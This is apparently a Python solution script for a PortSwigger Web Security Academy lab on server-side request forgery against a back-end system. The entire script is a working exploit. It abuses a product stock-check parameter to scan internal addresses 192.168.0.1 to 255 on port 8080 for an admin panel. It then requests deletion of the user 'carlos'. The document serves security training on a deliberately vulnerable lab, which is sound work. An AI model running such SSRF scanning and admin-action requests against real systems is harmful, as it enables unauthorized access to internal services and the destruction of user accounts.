# Created by sm6r, 2024
# Lab :  https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-backend-system
import requests
import sys

if len(sys.argv) != 2:
    print("Usage: python sol.py $URL$")
    exit()

url = sys.argv[1]+"/product/stock"

for i in range(1,256):    
    stock = f"/http://192.168.0.{i}:8080/admin"
    resp = requests.post(url,data={"stockApi":stock})
    print(stock,end= "  ")
    
    if resp.status_code == 200 :
        print(" --->  Got the correct one <--- ")
        newParm = stock+"/delete?username=carlos"
        res = requests.post(url,data={"stockApi":newParm})

        if(res.status_code == 200):
            print("[+] carlos is deleted ...")
        else:
            print(f"[-] didnt delete carlos, got {res.status_code}")

        break
    else:
        print(f"NO,{resp.status_code}")

